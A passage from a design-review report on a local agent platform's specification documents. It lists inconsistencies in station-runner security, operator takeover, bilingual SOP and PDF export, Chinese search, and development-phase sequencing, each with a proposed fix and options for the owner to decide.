Owner decision: (a) a per-station bound principal set at enrolment — recommended; (b) one MES service principal per line holding only `factory:start_job` with a station scope. In both cases no INV-7 capability.

Invariants: INV-12, INV-7

Traceability: lenses fresh-shop-floor; ids fresh-floor#12

### M2. P10 done-when requires a VNC view of a physical station that §5.2 says the platform never receives
Where: `CLAUDE.md:302-303`, `docs/DEVELOPMENT_PLAN.md:148-149`, `docs/PROMPTS.md:192-193`, `docs/DEVELOPMENT_PLAN.md:182`, `docs/ui-demo/slas-ui-demo.html:1251`, `CLAUDE.md:301-303`, `CLAUDE.md:299-300`, `CLAUDE.md:603-604`, `CLAUDE.md:188-189`
Also raised as: P10 done-when has the operator watching and taking over a physical station through 'the VNC view', which §5.2 excludes ('the platform never receives the station's raw display device'); Operator 'watch and take over through the VNC view' on a physical station is undefined — §5.2 says the platform receives screenshots, not the station display

What the documents say: CLAUDE.md gives noVNC only to the Xvfb display the platform owns and says a station returns screenshots and results; the P10 done-when, the P10 prompt, the risk table and the demo require watching and taking over a physical station through a VNC view.

Why it matters: P10 is milestone M6. Meeting its done criterion needs either a screen-share server in the runner plus a route from the factory LAN to the operator's browser, or a redefinition of 'watch and take over'; the choice changes the runner, factory-executor's network exposure and the Factory page.

Fix: Rewrite the P10 done-when and prompt: 'A real unit goes through the loop end to end while the operator follows the screenshot strip and runner status in the Factory page and can stop the job from Hold station or at the station itself.' Add to §5.2: 'Watching a physical station means the screenshot strip (one per GUI step plus every `screenshot_interval_s`); there is no live video from a station. VNC is Zone S only.' Change the DEVELOPMENT_PLAN risk row to 'operator takeover via VNC (Zone S) or locally at the station'.

Owner decision: (a) screenshots + status only, as §5.2 states — recommended; (b) an optional view-only VNC server in the runner, routed through factory-executor, documented by ADR because it opens a new path from the factory LAN to the frontend network.

Invariants: INV-4, INV-6

Traceability: lenses fresh-cross-document-and-plan, fresh-prompts-adr-gitignore, fresh-shop-floor; ids fresh-floor#5, fresh-plan#53, fresh-prompts#50

### M3. Operator take-over is promised but has no state, no exclusive-input rule and no journalling of operator actions
Where: `CLAUDE.md:299-300`, `CLAUDE.md:307-308`, `CLAUDE.md:100`, `docs/DEVELOPMENT_PLAN.md:148-149`, `docs/PROMPTS.md:192-193`, `docs/ui-demo/slas-ui-demo.html:1251`, `docs/DEVELOPMENT_PLAN.md:182`, `CLAUDE.md:308`, `CLAUDE.md:723`, `CLAUDE.md:641`, `docs/DEVELOPMENT_PLAN.md:68-72`
Also raised as: Operator takeover on the Zone S display has no semantics for pause, journal or resume; noVNC operator view has no authentication, authorisation or take-over rule; take-over is an unjournalled input path onto sandboxes and targets; The operator's noVNC 'watch and take over' view for Zone S displays has no WebUI surface or take-over semantics in any scope before P10 asserts it

What the documents say: Take-over is promised in four documents with no protocol: operator and screen driver share one input path (operator keystrokes can interleave with a `type` step carrying a secret), an operator focus change trips §5.2's own hard-stop rule, operator clicks on a station have physical effect but are not journalled, and there is no hand-back transition.

Why it matters: The P4 screen worker and the P10 station runner must implement take-over; two rules in §5.2 (watch-and-take-over vs hard-stop-on-focus-change) conflict as written, and an unjournalled operator interval breaks the run record that INV-6 and value 6 require.

Fix: §5.2: the VNC view is view-only until the operator clicks 'Take over', which (1) stops the driver at the current step boundary and moves the ticket to Paused {by: operator} (#1), (2) grants the operator exclusive input, (3) journals `operator_takeover`, a screenshot per VNC input event (or every ≤ 1 s), and `operator_handback` as `operator_action` entries; the focus-change hard stop is suspended while the operator holds input. Hand-back re-runs the interrupted step's `wait_for`/`assert_visible`; if it fails the run stays Paused. Station runner: lock local input while an agent batch runs. Add to P10 done-when: 'operator takes over mid-skill, hands back, and the journal shows the interval.'

Invariants: INV-3, INV-6, INV-7

Traceability: lenses fresh-cross-document-and-plan, fresh-runtime-state, fresh-shop-floor, security-threat-model; ids fresh-state#4, fresh-floor#27, security-threat-model#25, fresh-plan#26

### M4. Station runner lacks rotation/revocation, replay protection and an executable allowlist; enrolment is only in PROMPTS.md
Where: `CLAUDE.md:301-303`, `CLAUDE.md:755`, `CLAUDE.md:493`, `docs/PROMPTS.md:190`, `docs/DEVELOPMENT_PLAN.md:137-138`, `CLAUDE.md:95`, `CLAUDE.md:587-588`, `docs/DEVELOPMENT_PLAN.md:146`, `docs/PROMPTS.md:189-190`, `docs/DEVELOPMENT_PLAN.md:136-138`, `CLAUDE.md:301-302`
Also raised as: Station-runner mTLS names no issuer or revocation path; INV-1 rules out an external CA; Station runner certificate lifecycle (CA creation, rotation, revocation, offline update) is unspecified; enrolment exists only in PROMPTS.md; mTLS enrolment for station runners (CA, who signs, one-time code binding) is presumed by §12, P9 and P10 but designed nowhere

What the documents say: How keys rotate or are revoked, whether a captured signed batch can be replayed on another station or later, and which executables the runner may launch are unspecified. A compromised factory-LAN host replays batches; a compromised factory-executor runs any argv on every station.

Why it matters: The runner is the component with physical effect on production hardware; these are protocol choices that cannot be retrofitted after P9.

Fix: In CLAUDE.md §5.2 add a 'Station runner' rule block: enrolment via one-time code (as PROMPTS.md P10 already says) → CSR → cert with SAN = station id, 90-day rotation, CRL in `config/`; batches carry ticket id, station id, nonce, expiry and monotonic sequence and are rejected otherwise; `run`/`ssh` on stations limited to executables in `config/station-allowlist.yaml`; results and screenshots signed by the runner key. Reference it from DEVELOPMENT_PLAN.md P9.

Invariants: INV-1, INV-3, INV-4, INV-5, INV-6, INV-7

Traceability: lenses fresh-cross-document-and-plan, fresh-shop-floor, operability, security-threat-model; ids security-threat-model#22, fresh-floor#1, operability#12, fresh-plan#51

### M5. Station runner promises 'the same primitives' on Windows/Linux stations without per-OS backends
Where: `CLAUDE.md:301-303`, `CLAUDE.md:293`, `docs/PROMPTS.md:189`, `docs/PROMPTS.md:189-190`, `CLAUDE.md:217-218`, `CLAUDE.md:529`, `CLAUDE.md:299-303`, `CLAUDE.md:305-306`, `docs/DEVELOPMENT_PLAN.md:146`
Also raised as: Station OS: PROMPTS P10 packages the runner for 'Windows/Linux' while CLAUDE.md's screen stack is X11/xdotool and never names a station OS; Windows test stations are introduced only by the P10 prompt; the SSOT never states the station OS and its screen stack is X11-oriented

What the documents say: xdotool is X11-only and AT-SPI is Linux-only; on Windows the equivalents are pywinauto (UIA) + PyAutoGUI + mss/Pillow, with different focus, DPI and UAC secure-desktop behaviour. Neither CLAUDE.md nor the plan says which OSes the runner supports or how focus_window/`target`/`text` are met on each.

Why it matters: P9/P10 have no implementable definition of the runner's OS backends; factory skills written against Linux semantics may fail on real stations.

Fix: In §5.2 replace 'performs the same primitives locally' with 'implements the `ScreenPrimitives` interface with a per-OS backend: Linux = xdotool + AT-SPI + Tesseract; Windows = pywinauto (UIA) + PyAutoGUI + Tesseract; unsupported combinations fail at skill import with a sentence'. Add the Windows dependencies to §4.3 and an ADR; add 'station-runner backends tested against recorded fakes per OS' to §11 tests.

Owner decision: Support Windows stations (new deps: pywinauto, Windows packaging/signing) vs Linux-only stations for v1.

Invariants: INV-3

Traceability: lenses fresh-cross-document-and-plan, fresh-prompts-adr-gitignore, technical-feasibility; ids technical-feasibility#13, fresh-plan#50, fresh-prompts#49


### 3.9 Knowledge, RCA, SOP and dual language

### M1. zh-Hant PDF rendering has no home: WeasyPrint and a CJK font are assigned to no image and no font is named or pinned
Where: `CLAUDE.md:370`, `CLAUDE.md:95`, `CLAUDE.md:167`, `CLAUDE.md:174`, `docs/DEVELOPMENT_PLAN.md:84-86`, `CLAUDE.md:133-134`, `CLAUDE.md:214-220`, `docs/DEVELOPMENT_PLAN.md:81`, `CLAUDE.md:39`, `docs/DEVELOPMENT_PLAN.md:81-82`, `docs/PROMPTS.md:108-109`
Also raised as: WeasyPrint PDFs need bundled CJK fonts; INV-1 lists fonts but no bundle item covers them; WeasyPrint PDFs of zh-Hant SOPs need bundled CJK fonts and Pango/Cairo, which nothing declares; No CJK font is named for WeasyPrint PDFs; INV-1 forbids fetching one; PDF rendering (WeasyPrint + a bundled CJK font) is in §5.5 and the P5 scope but missing from the P5 prompt and never recorded as a dependency

What the documents say: PDF export needs WeasyPrint (Pango, HarfBuzz, fontconfig) and a font with Traditional Chinese coverage inside some image, but §12 assigns the renderer to no service — SOP generation sits in the orchestrator, export in the api Ticket Service — no font is named or pinned although INV-1 lists fonts explicitly, and P5's done-when checks the Markdown only. Without a bundled CJK face the zh-Hant PDF renders .notdef boxes while the .md looks fine.

Why it matters: The implementer must choose the container and the font; a missing font surfaces only when a customer opens the Chinese PDF — the artefact most likely to be printed on a line — silently defeating INV-13 for that export.

Fix: §5.5 and §12: 'PDF rendering runs in the api image (Ticket Service exports; it already mounts /data) with WeasyPrint <pinned> and Noto Sans CJK TC (fonts-noto-cjk <pinned>, SIL OFL 1.1); fontconfig restricted to bundled fonts.' P5 done-when: render the NullAgent SOP to PDF and assert no .notdef glyphs and that the embedded font list contains the CJK face. Add the font to THIRD_PARTY.md (#11) and the api image to #4's images list.

Owner decision: yes

Invariants: INV-1, INV-13

Traceability: lenses fresh-cross-document-and-plan, fresh-supply-chain, fresh-ui-and-ux, invariant-enforcement, technical-feasibility; ids fresh-bundle#14, invariant-enforcement#30, technical-feasibility#19, fresh-ux#22, fresh-plan#28

### M2. Postgres FTS does not segment Chinese; the FTS leg of hybrid search is blind to zh-Hant content
Where: `CLAUDE.md:216`, `CLAUDE.md:573-574`, `docs/DEVELOPMENT_PLAN.md:79`

What the documents say: PostgreSQL's default text-search parser tokenises on whitespace/punctuation, so a run of Han characters becomes one token; a query for 電源循環 matches only documents containing that exact run at token boundaries. Segmentation needs zhparser/pg_jieba or a bigram index (pg_bigm), i.e. a custom pinned Postgres image and an ADR.

Why it matters: Half of every SOP/ticket export is zh-Hant by INV-13; local-search-api and RCA retrieval design in P5 changes with the choice.

Fix: In §4.3 change 'Postgres FTS' to 'Postgres FTS (english config) + pg_bigm bigram index for zh-Hant/zh-Hans fields, both in the pinned postgres image' or 'Qdrant sparse BM25 (fastembed, offline) for both languages'. Add to §15 as a decision and write the ADR.

Owner decision: pg_bigm/pg_trgm (simple, custom image) vs zhparser/pg_jieba (true segmentation, larger dependency) vs Qdrant sparse vectors (no Postgres change).

Invariants: INV-13

Traceability: lenses technical-feasibility; ids technical-feasibility#20

### M3. Value 5 demands every status, error and approval 'in both languages', but INV-13, §9, the tech stack and the demo scope bilingual output to exports only; no UI localisation decision exists
Where: `CLAUDE.md:79-80`, `CLAUDE.md:107`, `CLAUDE.md:214-215`, `CLAUDE.md:580-585`, `CLAUDE.md:686`, `docs/ui-demo/slas-ui-demo.html:2`, `docs/ui-demo/slas-ui-demo.html:641-643`, `docs/ui-demo/slas-ui-demo.html:807`
Also raised as: WebUI locale undefined: value 5 promises bilingual statuses/errors/approvals, INV-13 and §9 cover only exports, demo is English-only

What the documents say: §1.2 value 5 requires every status, error and approval sentence in both languages; INV-13 covers only SOP/report/ticket exports; §9's ten rules say nothing about UI language; §4.3 has no i18n library or message catalogue; the §11 error object has no language dimension. The demo is an English-only UI (lang="en", every label and error in English) whose language setting applies to 'Reports and SOPs' only.

Why it matters: Whether the WebUI is bilingual decides the API error schema (strings vs. catalogue keys plus copied identifiers), the frontend build, and a new dependency that §0.3 says must be asked for first. Guessing wrong either violates value 5 or forces a rework of every error site.

Fix: Recommended (matches the demo): edit CLAUDE.md §1.2 value 5 (79-80) to 'Sentences, not codes, in every status, error, approval and report. SOPs, reports and ticket exports are produced in English and Chinese together (INV-13).' Add §9 rule 11: 'WebUI copy is English; every export is EN + zh-Hant; error objects carry a stable `code` alongside the three sentences so a message catalogue can be added later by ADR.' Alternative: bilingual UI — §9 rule 11 'every UI string, including the three parts of every error, lives in a message catalogue with en and zh-Hant entries; the backend error object carries keys plus copied identifiers; the WebUI renders the user's locale', add a pinned react-i18next to §4.3 via ADR, and set a per-user locale on the Settings page.

Owner decision: A (recommended for v1): English UI, bilingual exports; value 5 reworded to match INV-13 and the demo. B: bilingual UI with per-user locale, message catalogue, react-i18next (ADR), error struct carries keys.

Invariants: INV-13

Traceability: lenses fresh-ui-and-ux, ui-and-ux; ids ux-copy-and-i18n#1, fresh-ux#1

### M4. Bug-ticket `[Issue] … | [Owner] EE` line is defined only as a rendered English string; no Finding fields exist, so the INV-13 bilingual ticket export has no structured source, and the demo shows the draft ticket in English only
Where: `CLAUDE.md:643`, `CLAUDE.md:350-351`, `CLAUDE.md:345-347`, `CLAUDE.md:107`, `CLAUDE.md:604-605`, `docs/DEVELOPMENT_PLAN.md:48-49`, `docs/ui-demo/slas-ui-demo.html:784-789`, `docs/ui-demo/slas-ui-demo.html:801`, `docs/ui-demo/slas-ui-demo.html:732`
Also raised as: [Issue] bug-ticket line is an unstructured English string; no Finding schema; demo adds fields absent from §5.4

What the documents say: The ticket schema lists `findings[]` with no fields; §5.4 and §10.2 define a bug ticket only by an English bracket-pipe string mixing prose, a device label, a BDF and an owner code. DEVELOPMENT_PLAN schedules a `Finding` schema for P2 but the SSOT never says what it holds. The demo renders the draft ticket as that English mono block while its export button claims 'English and 中文'.

Why it matters: Without a Finding schema, implementers will store the rendered string and either model-translate the whole line for the Chinese export (risking translated BDFs, contrary to INV-13) or export English-only tickets (violating INV-13). It also decides what the deterministic owner routing and the fingerprint operate on.

Fix: In CLAUDE.md §5.4 (345-347) define `Finding {fingerprint, symptom (prose with typed tokens), component {label, bdf}, phase, owner_code, severity, occurrences, evidence[]}` in `slas_schemas/ticket.py`, and in §10.2 (643) state: 'the `[Issue] … | [Owner] …` line is a renderer output produced in en and zh-Hant from Finding; component labels, BDFs and phases are inserted by code; owner and severity codes are rendered through the glossary display map.' In the demo (784-789) show the draft ticket with English / 中文 tabs like the SOP below it.

Owner decision: A (recommended): the bracket line is the English export rendering of Finding and a zh-Hant rendering is exported with it; the UI shows a sentence plus 'Review ticket' (as the demo already does at 732). B: the bracket line is a fixed downstream bug-tracker convention that stays English-only as the machine title; then INV-13 must be amended to exclude ticket titles and the demo's 'English and 中文' export claim narrowed to the body and SOP.

Invariants: INV-13

Traceability: lenses fresh-ui-and-ux, ui-and-ux; ids ux-copy-and-i18n#5, fresh-ux#9

### M5. SopModel prose fields have no typed slot for identifiers, so 'copied by code, never translated' has no mechanism in the schema
Where: `CLAUDE.md:363-364`, `CLAUDE.md:366-369`, `CLAUDE.md:622`, `docs/DEVELOPMENT_PLAN.md:85-86`, `docs/ui-demo/slas-ui-demo.html:428-430`, `docs/ui-demo/slas-ui-demo.html:442-444`

What the documents say: `action`, `expected`, `title` and the other prose fields are untyped strings authored whole by the model and handed whole to the translator. Nothing separates 'bmc_tool/redfish/client.py', 'pytest -q', '30 s' or 'BurnIn v3.2' from translatable text, so code cannot copy them and the P5 done-when ('identical commands and numbers') and the §8.1 terminology gate have nothing to check against. The demo shows the desired result as hand-written parallel strings.

Why it matters: sop.json is an exported public artifact (§4.4), so its shape is an interface. Implementers must invent a placeholder convention that the planner prompt, the renderer and the eval all agree on; a wrong guess yields Chinese SOPs with altered paths or numbers, which in a validation SOP is a safety issue.

Fix: In CLAUDE.md §5.5 (363-369) add: 'Every prose field is `RichText {template: str, tokens: {name: {kind: path|command|version|number|bdf|product|identifier, value: str}}}`. Models emit the template with `{{name}}` placeholders and the tokens separately; the translator receives only the template; renderers substitute tokens verbatim in both languages; the eval asserts token-set equality between the en and zh-Hant renderings (§8.1).' Apply the same rule to `title` and to Finding.symptom (ux-copy-and-i18n#5); list product and agent names as `do_not_translate` glossary entries.

Invariants: INV-13

Traceability: lenses ui-and-ux; ids ux-copy-and-i18n#6

### M6. Simplified-Chinese toggle contradicts the zh-Hant-only file layout, the script-less `sop{en, zh}` field, the glossary examples, and open decision (9); the demo places the toggle with an admin, §5.5 with Settings
Where: `CLAUDE.md:373`, `CLAUDE.md:242`, `CLAUDE.md:370`, `CLAUDE.md:347`, `CLAUDE.md:368`, `CLAUDE.md:571`, `CLAUDE.md:809`, `docs/ui-demo/slas-ui-demo.html:641-643`, `docs/ui-demo/slas-ui-demo.html:1066`, `CLAUDE.md:367-368`, `CLAUDE.md:476`, `docs/ui-demo/slas-ui-demo.html:643`, `CLAUDE.md:367-370`, `docs/DEVELOPMENT_PLAN.md:81`, `docs/ui-demo/slas-ui-demo.html:632`, `docs/ui-demo/slas-ui-demo.html:1062-1068`, `docs/DEVELOPMENT_PLAN.md:81-83`
Also raised as: Fields say 'zh', files and glossary say zh-Hant, and the Simplified toggle has no defined mechanism or glossary; Simplified-Chinese toggle has no glossary column, filename, ticket field or implementing phase; Simplified Chinese toggle: scope, owner and production method undefined; demo says 'enabled by an admin', §5.5 says 'a Settings toggle', neither page has the control; Language tag inconsistency: `zh` in ticket and skill schemas vs `zh-Hant` in file layout and renderer

What the documents say: The SSOT fixes zh-Hant as decided (373, 242, 370) while listing it as open (809), offers a Simplified toggle with no defined output (file name, glossary column, conversion method, metric label values), and types the ticket field as a script-less `zh` (347). The demo says an admin enables Simplified (643) but the Admin panel offers no such control (1066), and §5.5 puts the toggle under per-user Settings.

Why it matters: Whether the toggle re-renders from a second glossary column, runs a deterministic converter (a new dependency needing an ADR), or re-translates with the model decides the glossary schema, the export file set, the metric labels, and whether an INV-13 export is en+zh-Hant, en+zh-Hans, or all three.

Fix: Recommended for v1: in CLAUDE.md §5.5 (373) replace the sentence with 'Chinese is Traditional (zh-Hant). Simplified Chinese is out of scope for v1; adding it needs an ADR covering a deterministic converter dependency, a `zh-Hans` glossary column, `sop.zh-Hans.md` and the `lang` metric values.' Rename §5.4 `sop{en, zh}` (347) to `sop{en, zh_hant}`, mark §15 item (9) resolved, and drop 'Simplified Chinese can be enabled by an admin' from the demo (643). Alternative: make Chinese script an installation-level Admin → Settings value (default zh-Hant); exports produce en plus the configured script; §4.4 becomes `sop.<zh-script>.md`; glossary gains a zh-Hans column; converter dependency by ADR.

Owner decision: A (recommended): zh-Hant only in v1; Simplified deferred behind an ADR; all references made consistent. B: installation-level script setting (Admin → Settings, default zh-Hant), en + configured script exported, second glossary column, deterministic converter via ADR, file names and metric labels parameterised.

Invariants: INV-13

Traceability: lenses fresh-cross-document-and-plan, fresh-ui-and-ux, invariant-enforcement, spec-ambiguity, ui-and-ux; ids ux-copy-and-i18n#7, invariant-enforcement#13, spec-ambiguity#26, fresh-ui#29, fresh-ux#10, fresh-ux#20, fresh-plan#30


### 3.10 Development plan: sequencing and coverage

### M1. The orchestrator service that hosts the kernel is built in no phase
Where: `CLAUDE.md:717-720`, `CLAUDE.md:171-175`, `docs/DEVELOPMENT_PLAN.md:46-51`, `docs/PROMPTS.md:67-73`, `docs/PROMPTS.md:203`

What the documents say: The word 'orchestrator' occurs in the plan zero times and in PROMPTS once (the P11 trace). P2 builds the kernel package and the API; P3-P6 assume a running orchestrator that receives jobs, calls the gateway and drives sandbox/screen workers; no phase creates services/agent-core-orchestrator or its compose entry.

Why it matters: P2's done-when ('Running the NullAgent ... killing the process mid-run and restarting resumes') needs a host process; without a scoped service the kernel ends up inside the API process, contradicting §11's separation and §12.

Fix: docs/DEVELOPMENT_PLAN.md P2 scope line 47-51: add '`services/agent-core-orchestrator`: long-running worker that dequeues jobs from the API (Redis), runs the kernel, exposes /healthz and /metrics; compose entry per §12; the NullAgent run is triggered from the Tickets page and executes in this service'. P2 done-when line 54: 'Killing the orchestrator container mid-run ...'. docs/PROMPTS.md P2 line 67-73: mirror.

Traceability: lenses fresh-cross-document-and-plan; ids fresh-plan#16

### M2. P4 must run the §6.3 redfish and ssh steps against fakes, but slas-hal and its fakes are a P7 deliverable and the map has no P7→P4 edge
Where: `docs/DEVELOPMENT_PLAN.md:73-74`, `docs/DEVELOPMENT_PLAN.md:116-117`, `docs/DEVELOPMENT_PLAN.md:13-20`, `CLAUDE.md:543-545`, `CLAUDE.md:529`

What the documents say: sel-collect-clear needs a Redfish get_sel that returns a file and a count, and station-login-burnin needs an ssh fake, at P4 run time; the HAL interface and fakes are first built in P7, which the map places after P4.

Why it matters: P4 either ships a throwaway Redfish/SSH stub inside slas-skills (duplicating HAL, against §0.3 'route hardware actions through slas_hal') or cannot meet its done-when.

Fix: Move into docs/DEVELOPMENT_PLAN.md P4 scope (line 67-72): '`slas-hal` package skeleton: the `oob` and `inband` driver interfaces plus a minimal recorded fake (get_power_state, get_sel with file and count, get_inventory, power_off gated by approval; ssh returning scripted stdout)'. P7 scope line 116-117 → 'extend slas-hal fakes with scripted SOL, SEL streams, inventory diffs and ugly fixtures'. Add 'P4 owns the HAL interface' to the map notes. docs/PROMPTS.md P4 line 91-99: mirror.

Invariants: INV-12, INV-7

Traceability: lenses fresh-cross-document-and-plan; ids fresh-plan#23

### M3. P6 done-when requires 'opens a PR on local GitLab' to be CI-green; no compose file, bundle or phase provides a GitLab, the prompt tests with a fake Git server, and open decision (7) is presumed settled
Where: `docs/DEVELOPMENT_PLAN.md:106`, `docs/PROMPTS.md:144-146`, `CLAUDE.md:427`, `CLAUDE.md:808`, `docs/DEVELOPMENT_PLAN.md:5-6`

What the documents say: A 'local GitLab' is a site resource, not a CI fixture; as a CI criterion the line is unachievable unless a GitLab image joins the bundle (a new container needing an ADR) or the fake Git server emulates the GitLab MR API — which the prompt does not require. The line also picks GitLab while §15 leaves decision (7) open, and says PR where GitLab has MRs.

Why it matters: Decides what the fake Git server must emulate (GitLab MR, Gitea PR, GitHub PR per §5.7) and whether P6 can be closed without a site GitLab.

Fix: docs/DEVELOPMENT_PLAN.md line 106 → '"Push to gitlab-firmware" pushes a branch and opens a merge request against the fake Git server's GitLab-API emulation in CI (Gitea and GitHub API paths covered by unit tests); the M4 demo repeats it against the site's own Git host'. docs/PROMPTS.md line 144: 'a fake Git server that also emulates the GitLab MR, Gitea PR and GitHub PR endpoints'. Record decision (7) before P6b starts.

Owner decision: A (recommended default): CI criterion host-agnostic via the fake server's API emulation; real host only in the demo; decision (7) stays open until the site confirms. B: ship a Gitea image in the bundle as the quickstart Git host (small, single container, needs an ADR) and test against it in CI.

Invariants: INV-1, INV-14

Traceability: lenses fresh-cross-document-and-plan; ids fresh-plan#31

### M4. Approvals, leases and quota (API cross-cutting services) are assigned to no phase scope, yet P7 and P9 done-whens require them
Where: `CLAUDE.md:166`, `CLAUDE.md:284-285`, `CLAUDE.md:261`, `docs/DEVELOPMENT_PLAN.md:125`, `docs/DEVELOPMENT_PLAN.md:138`, `docs/PROMPTS.md:67-73`, `docs/DEVELOPMENT_PLAN.md:46-51`, `docs/DEVELOPMENT_PLAN.md:73-74`, `docs/DEVELOPMENT_PLAN.md:115-125`, `CLAUDE.md:259-261`, `CLAUDE.md:285`, `CLAUDE.md:637`, `CLAUDE.md:647`, `CLAUDE.md:655`, `docs/DEVELOPMENT_PLAN.md:115-121`
Also raised as: The INV-7 approval mechanism (request, decision endpoint, PLAN→ACT gate) is asserted by P4, P7 and P8 done-whens but built in no phase scope; Leases (target, station, exclusive) and per-user quota are API responsibilities used by P7 and P9 but scoped in no phase

What the documents say: INV-7's mechanism — approval requests, their storage, per-run scope, the UI dialog and the deterministic gate that refuses to dispatch — is kernel/API code per §4.2 and §5.1, but 'approval' appears in the plan only in done-when lines (74, 125, 130), never in a scope; 'lease' appears only as 'factory-executor with station leases' (line 138); 'quota' only as sandbox quotas. The P2 prompt and scope omit all three.

Why it matters: P7 (target lease, AC-cycle approval) and P9 (station lease, PASS override) will each build approvals and leases inside their executor — the pattern §5.1 forbids — and the two will diverge; the INV-7 gate then has two implementations.

Fix: docs/DEVELOPMENT_PLAN.md P2 scope (line 47-51) and docs/PROMPTS.md P2 (line 67-73): add 'approval requests in apps/api + slas-kernel (create, pending, approve/deny with user and reason, per-run scope; the executor gate refuses any destructive step without a matching approval id), exclusive resource leases with TTL (targets, stations, projects) and per-user quota, exercised by NullAgent with one destructive fake step'. P7 and P9 scopes: 'use the kernel approval and lease services' instead of building their own.

Invariants: INV-11, INV-7

Traceability: lenses fresh-cross-document-and-plan, fresh-prompts-adr-gitignore; ids fresh-prompts#25, fresh-plan#13, fresh-plan#14

### M5. `services/local-search-api` (§12, §13, §8.3 Option A) is built by no phase
Where: `CLAUDE.md:736-737`, `CLAUDE.md:778`, `CLAUDE.md:767-768`, `docs/PROMPTS.md:105-106`, `docs/DEVELOPMENT_PLAN.md:79-83`, `CLAUDE.md:672-673`, `docs/DEVELOPMENT_PLAN.md:79-80`
Also raised as: services/local-search-api (§8.3 Option A, §12 start order, §13) is built in no phase; P5 builds retrieval as a library — and the §12 entry itself contradicts §11's 'gateway is the only component talking to vLLM'

What the documents say: §12 declares local-search-api as a default service, §13 lists its directory and the start order waits for it, but 'local-search' appears nowhere in the plan or the prompt pack; P5 builds only the slas-rag package and the Knowledge page. Nothing says whether retrieval is a separate service (as §12 draws) or in-process in the orchestrator.

Why it matters: `docker compose up` in P11/P12 references an image nobody built and install.sh's 'wait healthy' fails, or the SSOT's topology is wrong from P5 on. Note also that §12 puts local-search-api on slas-inference (direct vLLM access) while §11 line 672-673 makes llm-gateway the only component talking to vLLM and the P5 prompt says 'rerank through the gateway' — the same decision settles that.

Fix: Owner decides (options). A: docs/DEVELOPMENT_PLAN.md P5 scope (line 79-83) and docs/PROMPTS.md P5 (line 105-106): add 'expose slas-rag as services/local-search-api (FastAPI, SEARCH_MODE=internal_corpus, network slas-knowledge; embeddings and rerank via llm-gateway, not vLLM directly)' and fix CLAUDE.md line 737 networks to [slas-knowledge, slas-backend]. B: remove local-search-api from CLAUDE.md §12 (line 736-737, 768) and §13 (line 778) by ADR and state that the orchestrator hosts slas-rag in-process.

Owner decision: A) (recommended default) Separate service as §12 draws, but reached through the gateway for model calls (fixes the §11 vLLM-exclusivity conflict). B) In-process in the orchestrator; delete the service from §12/§13 and the start order (simpler, one fewer container).

Traceability: lenses fresh-cross-document-and-plan, fresh-prompts-adr-gitignore; ids fresh-prompts#33, fresh-plan#29

### M6. Eval tier (§8.1, P3/P5) needs a live local model, but §11 says no test may need one
Where: `CLAUDE.md:563-567`, `CLAUDE.md:687-691`, `docs/DEVELOPMENT_PLAN.md:62-64`, `docs/DEVELOPMENT_PLAN.md:82-83`, `docs/PROMPTS.md:109-110`, `docs/PROMPTS.md:268-272`

What the documents say: tests/eval is a listed test tier whose gates (schema validity, RAG faithfulness, triage recall, consensus agreement, back-translation) can only be measured on real model output, yet the same §11 paragraph says no test needs a live model; P3 and P5 done-when items depend on the eval harness and the PROMPTS weekly health check would flag every tests/eval file as drift.

Why it matters: The implementer of P3/P5 must guess whether eval runs on a GPU runner with real weights (needs a GPU CI lane and a golden set) or against the fake vLLM (then the ≥ 98% / ≥ 0.90 gates measure the fixture). The choice changes CI topology and what 'done' means for P3 and P5.

Fix: CLAUDE.md §11 Tests: replace the last sentence with 'No unit, integration, hal, screen, skills, e2e or deploy test needs real hardware, a real display, or a live model. tests/eval is the one exception: it talks only to local vLLM through slas_eval/judges.py, runs nightly on the GPU runner and never in PR CI; PR CI runs the eval harness against the fake vLLM for wiring only.' DEVELOPMENT_PLAN.md P3 done-when: split 'eval harness runs against local judges only' into 'harness wiring test passes against the fake vLLM in PR CI, and the static check for api.openai.com passes' plus 'a nightly GPU job runs the harness against local vLLM'. Mirror in P5 done-when for the terminology/back-translation checks. PROMPTS.md weekly health check: add 'other than tests/eval' after 'a live model'.

Owner decision: (a) Recommended default: nightly GPU lane with real local weights runs tests/eval; PR CI runs only the harness wiring against the fake vLLM. (b) No GPU CI lane: eval runs only on a deployed installation via a `slas eval` command; CI checks wiring and the api.openai.com assertion. Either way the §11 sentence must carve out tests/eval.

Invariants: INV-2

Traceability: lenses plan-sequencing-and-coverage; ids plan-sequencing-and-coverage#1

### M7. Sandboxes have no network but the Coding loop must build/test projects with third-party dependencies; no package source is specified or scheduled
Where: `CLAUDE.md:739`, `CLAUDE.md:618`, `CLAUDE.md:133-134`, `docs/DEVELOPMENT_PLAN.md:89-90`, `docs/DEVELOPMENT_PLAN.md:104-105`, `docs/PROMPTS.md:117`, `docs/ui-demo/slas-ui-demo.html:600`, `docs/ui-demo/slas-ui-demo.html:598`, `CLAUDE.md:145`
Also raised as: Terminal copy asserts an internal package mirror for a sandbox with no network

What the documents say: A toolchain is not a dependency set. With DEFAULT_NETWORK none, `uv sync`/`pip install`, `npm install`, `cargo build` and `go build` for any plan.md project with a lockfile fail on the first third-party package. The UI demo already promises 'the internal mirror the platform configures', but CLAUDE.md §12/§13 define no mirror or offline cache and no phase (P6 included) schedules one.

Why it matters: P6's own demo project has a uv.lock, so P6 done-when 'agent commits passing code' is not reachable for any realistic project unless the implementer invents a dependency source. The three possible answers (offline cache mount, mirror service on a new network, fat images) change sandbox networking, bundle contents, install.sh and whether 'no network' stays literally true.

Fix: Decide the mechanism (options below), then: CLAUDE.md §4.4 add the on-disk location of the offline package cache; §12 sandbox-manager add the read-only mount (or the mirror service and network); §3 state that the bundle seeds it and `slas upgrade` refreshes it; §13 add the service or package. DEVELOPMENT_PLAN.md P6 scope: add 'offline dependency source for Python, Node, Rust, Go, seeded from the bundle'; P6 done-when: add 'a Python project whose uv.lock names a third-party package builds and passes its tests inside a sandbox under egress-DROP'. PROMPTS.md P6a: add the same deliverable.

Owner decision: (a) Recommended default: a read-only offline package cache under ${SLAS_DATA_ROOT}/Toolchains/cache (pip --no-index --find-links, npm offline cache, cargo vendored registry with net.offline, GOPROXY=file://) bind-mounted into every sandbox; DEFAULT_NETWORK stays none and every 'no network' statement stays true. (b) A package-mirror service (devpi/verdaccio/athens class, new dependency, ADR) on a new internal slas-mirror network that sandboxes join; every 'no network' statement, PROMPTS P6a and INV-14 wording must then be revised and the mirror must be provably unable to reach any host in config/git-hosts.yaml. (c) Fat per-language images with pre-baked dependency sets; fails for any plan needing an unlisted package, not recommended.

Invariants: INV-1, INV-14, INV-8

Traceability: lenses fresh-ui-and-ux, plan-sequencing-and-coverage; ids plan-sequencing-and-coverage#2, fresh-ui#20

